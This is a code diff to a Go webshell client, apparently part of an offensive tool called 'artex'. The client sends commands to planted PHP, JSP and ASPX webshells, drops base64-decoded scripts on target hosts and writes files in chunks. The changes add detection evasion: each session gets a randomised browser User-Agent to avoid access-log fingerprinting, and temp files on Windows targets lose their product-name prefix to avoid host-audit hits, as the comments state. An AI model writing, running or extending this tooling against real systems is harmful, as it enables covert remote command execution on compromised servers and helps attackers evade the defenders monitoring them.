@@ -27,6 +27,8 @@ import (
 	"strings"
 	"sync"
 	"time"
+
+	"github.com/Autumn-27/artex/agent"
 )
 
 // ChunkSize 是文件读写的分块大小（64KB 原文,base64 后约 85KB)。
@@ -71,6 +73,11 @@ type HTTPShell struct {
 	variant  string // php: eval | assert;phpcmd: cmd
 	platform string // linux | windows
 
+	// ua 是本会话所有目标侧请求的 User-Agent(批 7 P0-2:建会话时从浏览器 UA
+	// 池随机选一个,随 Secret 落库,会话期间稳定不换——自报家门的固定 UA 与
+	// 换来换去的 UA 都是 access log 里的识别特征)。
+	ua string
+
 	mu    sync.RWMutex
 	funcs []string // php 可用执行函数（探测记忆，禁用变化时重探）
 
@@ -101,6 +108,12 @@ func DirectHTTPClient(timeout time.Duration) *http.Client {
 	}
 }
 
+// randomSessionUA 从浏览器 UA 池（与 worker 流量同一池，agent/uapool.go）随机
+// 取一个。每会话创建时取一次，会话期间稳定（Secret 落库带回）。
+func randomSessionUA() string {
+	return randPick(agent.DefaultUAPool())
+}
+
 // NewHTTPShell 由已知参数构造会话（DB 恢复路径：马型已探测过，不重复探测）。
 // lang: php / phpcmd / jsp / aspx。password 为空默认 "cmd"。
 func NewHTTPShell(shellURL, password, lang string) (*HTTPShell, error) {
@@ -109,6 +122,7 @@ func NewHTTPShell(shellURL, password, lang string) (*HTTPShell, error) {
 		password: password,
 		lang:     strings.ToLower(strings.TrimSpace(lang)),
 		client:   DirectHTTPClient(0),
+		ua:       randomSessionUA(),
 	}
 	if s.password == "" {
 		s.password = "cmd"
@@ -182,6 +196,8 @@ type Secret struct {
 	// 加密马（phpenc/jspenc）专有：会话密钥（base64 32B）与锁存的加密模式。
 	Key     string `json:"key,omitempty"`
 	EncMode string `json:"enc_mode,omitempty"`
+	// UA 是会话级 User-Agent（批 7 P0-2：随 secret 落库，恢复后不换）。
+	UA string `json:"ua,omitempty"`
 }
 
 // Secret 导出当前连接参数（探测后的完整指纹）。
@@ -190,7 +206,7 @@ func (s *HTTPShell) Secret() Secret {
 		URL: s.url, Password: s.password, Lang: s.lang,
 		Variant: s.variant, Platform: s.platform, Funcs: s.Funcs(),
 		DisableFunctions: s.disableFuncs, Mail: s.mailOK, Putenv: s.putenvOK,
-		Bypass: s.bypass, BypassLib: s.bypassLib,
+		Bypass: s.bypass, BypassLib: s.bypassLib, UA: s.ua,
 	}
 	if s.enc != nil {
 		sec.Key = base64.StdEncoding.EncodeToString(s.enc.key)
@@ -221,8 +237,12 @@ func RestoreHTTPShell(id int64, sec Secret) (*HTTPShell, error) {
 	s.putenvOK = sec.Putenv
 	s.bypass = sec.Bypass
 	s.bypassLib = sec.BypassLib
+	if sec.UA != "" { // 旧库记录无 UA 字段:保留构造时已随机的值,不回填空
+		s.ua = sec.UA
+	}
 	if s.enc != nil {
 		s.enc.SetMode(sec.EncMode)
+		s.enc.ua = s.ua
 	}
 	return s, nil
 }
@@ -254,7 +274,7 @@ func (s *HTTPShell) postH(ctx context.Context, fields url.Values, timeout time.D
 		return "", nil, opError("http", "构造请求失败: %v", err)
 	}
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-	req.Header.Set("User-Agent", "Mozilla/5.0 (ARTEX)")
+	req.Header.Set("User-Agent", s.ua)
 	resp, err := s.client.Do(req)
 	if err != nil {
 		return "", nil, opError("http", "HTTP 请求失败（马不可达：目标宕机/超时/连接重置）: %v", err)
@@ -600,7 +620,7 @@ func needsScriptDrop(cmd string) bool {
 // 临时文件用调用方命名空间前缀（复盘 R5:per-worker 前缀防多 worker 互相覆盖）
 // + 随机段，执行完清理（后台任务已 fork，不受影响）。
 func scriptDrop(cmd, prefix string) string {
-	var b [6]byte
+	var b [5]byte
 	_, _ = rand.Read(b[:])
 	path := prefix + hex.EncodeToString(b[:]) + ".sh"
 	return "echo " + b64e([]byte(cmd)) + " | base64 -d > " + path +
@@ -895,7 +915,8 @@ func (s *HTTPShell) writeFileSh(ctx context.Context, path string, data []byte) e
 func (s *HTTPShell) writeFileCmd(ctx context.Context, path string, data []byte) error {
 	var b [6]byte
 	_, _ = rand.Read(b[:])
-	tmp := "%TEMP%\\artex_" + hex.EncodeToString(b[:]) + ".b64"
+	// 批 7 P0-3:纯随机文件名,不带产品名前缀（%TEMP% 下的固定前缀是主机审计命中点）。
+	tmp := "%TEMP%\\" + hex.EncodeToString(b[:]) + ".b64"
 	for off := 0; off < len(data) || (off == 0 && len(data) == 0); off += ChunkSize {
 		end := off + ChunkSize
 		if end > len(data) {
